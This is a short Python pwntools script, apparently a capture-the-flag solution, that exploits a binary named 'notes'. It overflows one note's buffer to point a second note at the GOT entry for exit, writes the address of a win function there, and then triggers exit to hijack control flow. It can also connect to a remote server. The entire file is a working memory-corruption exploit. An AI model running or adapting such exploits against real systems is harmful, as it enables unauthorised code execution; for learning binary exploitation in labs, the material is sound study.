#!/usr/bin/env python3

from pwn import *

elf = ELF("./notes")

context.binary = elf

gdbscript ='''
break *0x0000000000401439
'''

def conn(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([elf.path] + argv, *a, **kw)

r = conn()
def add(index):
    r.recv()
    r.sendline("1")
    r.recvline()
    r.sendline(str(index))
    r.recvline()
    r.sendline(b"AA")

def edit(index, content):
    r.recv()
    r.sendline("2")
    r.recvline()
    r.sendline(str(index))
    r.recvline()
    r.sendline(content)

def main():
    
    add(0)
    add(1)
    pause()
    edit(0, b"A"*0x20 + p64(elf.got["exit"]))
    pause() 
    edit(1, p64(elf.sym.win))
    pause()  
    r.sendline("0")

    r.interactive()


if __name__ == "__main__":
    main()
